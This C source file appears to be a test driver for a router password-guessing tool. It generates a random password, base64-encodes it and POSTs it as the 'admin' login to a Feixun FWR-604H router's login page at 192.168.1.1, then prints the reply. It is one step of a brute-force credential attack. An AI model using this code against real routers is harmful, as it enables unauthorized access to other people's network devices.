#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../main.h"
#include "../core/debug.h"
#include "../core/cstring.h"
#include "../core/http.h"
#include "../core/base64.h"
#include "guess_username_password.h"
#include "guess_model.h"

int main(void)
{

    // random password do job
    char test_rebuf_GetRandomPassword[BIG_BUFFER_SIZE];
    pInput test_input_GetRandomPassword = (pInput)malloc(sizeof(Input));
    test_input_GetRandomPassword->debug_level = 2;
    test_input_GetRandomPassword->seed = 10;
    test_input_GetRandomPassword->random_password_length = 8;

    GetRandomPassword(test_rebuf_GetRandomPassword, test_input_GetRandomPassword);
    DisplayDebug(DEBUG_LEVEL_2, test_input_GetRandomPassword->debug_level, "random password: %s", test_rebuf_GetRandomPassword);

    // base64 do job
    char *b64message;
    Base64Encode(&b64message, test_rebuf_GetRandomPassword, strlen(test_rebuf_GetRandomPassword));

    // combined data now
    char send_buff[strlen(FEIXUN_FWR_604H_REQUEST_MODEL) + MAX_SEND_DATA_SIZE];
    char *url = "http://192.168.1.1/login.asp";
    char *host;
    char *suffix;
    int port;

    char send_data_buff[MAX_SEND_DATA_SIZE];
    sprintf(send_data_buff, FEIXUN_FWR_604H_REQUEST_DATA_MODEL, "admin", b64message);

    SplitURL(url, &host, &suffix, &port);
    //DisplayInfo("%ld", strlen(send_data_buff));
    sprintf(send_buff, FEIXUN_FWR_604H_REQUEST_MODEL, host, url, strlen(send_data_buff), send_data_buff);
    //DisplayDebug(DEBUG_LEVEL_2, test_input_GetRandomPassword->debug_level, "Send:\n%s\n", send_buff);

    // send now
    char *response;
    //DisplayInfo("*********************");
    //DisplayInfo("url: %s", url);
    HTTPPostMethod(&response, url, send_buff, 0);
    DisplayInfo(response);

    FreeSplitURLSpace(host, suffix);

    return 0;
}